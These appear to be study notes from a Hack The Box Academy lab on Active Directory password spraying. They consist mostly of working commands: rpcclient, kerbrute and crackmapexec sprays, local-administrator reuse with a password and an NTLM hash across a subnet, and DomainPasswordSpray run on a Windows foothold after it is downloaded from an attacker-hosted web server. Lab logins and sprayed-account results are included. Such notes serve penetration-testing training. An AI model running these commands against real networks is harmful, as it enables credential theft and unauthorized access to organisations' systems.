# Internal Password Spraying - from Linux

Different tools to spray Welcome1 Password :
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $TARGET | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc $TARGET valid_users.txt  Welcome1
sudo crackmapexec smb $TARGET -u valid_users.txt -p Welcome1 | grep +

Validate credentials :
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

Local Administrator Password Reuse :

When we find a common used password (or hash), we can try to use onto other machines locally on the network

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -p Welcome1 | grep +
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# Internal Password Spraying - from Windows

From a foothold on a domain-joined Windows host : DomainPasswordSpray tool is highly effective :

Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue


## LAB

### Linux

ssh htb-student@$TARGET
HTB_@cademy_stdnt!

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: mholliday, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT

### Windows

xfreerdp /u:htb-student /v:$TARGET
Academy_student_AD!

dir [DomainPasswordSpray] /s

C:\Users\htb-student>dir [DomainPasswordSpray] /s
 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72
File Not Found

wget https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1
python3 -m http.server

(New-Object Net.WebClient).DownloadFile('http://10.10.15.153:8000/DomainPasswordSpray.ps1','DomainPasswordSpray.ps1')

cd C:\Tools\
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue

[*] SUCCESS! User:dbranch Password:Winter2022